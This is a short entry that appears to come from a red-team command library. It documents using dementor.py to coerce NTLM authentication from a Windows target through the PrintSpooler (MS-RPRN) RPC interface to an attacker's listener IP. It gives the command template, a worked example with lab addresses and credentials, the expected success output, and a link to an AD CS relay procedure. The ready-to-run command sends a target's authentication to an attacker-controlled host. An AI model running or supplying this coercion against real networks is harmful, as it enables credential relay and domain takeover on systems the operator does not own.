---
id: new-uuid-for-dementor
name: coerce-auth-printspooler-dementor
type: command
executor: bash
data: >-
  python3 dementor.py $_ATTACKER_IP $_TARGET_IP -u $_USERNAME -p $_PASSWORD -d
  $_DOMAIN
output: null
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - coercion
  - ntlm
  - rpc
verified: true
validated: true
---

# coerce-auth-printspooler-dementor

## Command

```bash
python3 dementor.py $_ATTACKER_IP $_TARGET_IP -u $_USERNAME -p $_PASSWORD -d $_DOMAIN
```

## Description

Coerces NTLM authentication via PrintSpooler (MS-RPRN) RPC to the attacker's listener.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_IP | Attacker's listener IP | Yes |
| $_TARGET_IP | Target machine IP | Yes |
| -u $_USERNAME | Username | Yes |
| -p $_PASSWORD | Password | Yes |
| -d $_DOMAIN | Domain name | Yes |

## Examples

### Basic Usage

```bash
python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local
```

## Expected Output

Coercing authentication via MS-RPRN to 10.10.10.10
Success: Target authenticated to listener

## Related

- [[procedures/AD-CS-Relay-Attack-with-Rubeus-and-PetitPotam]]
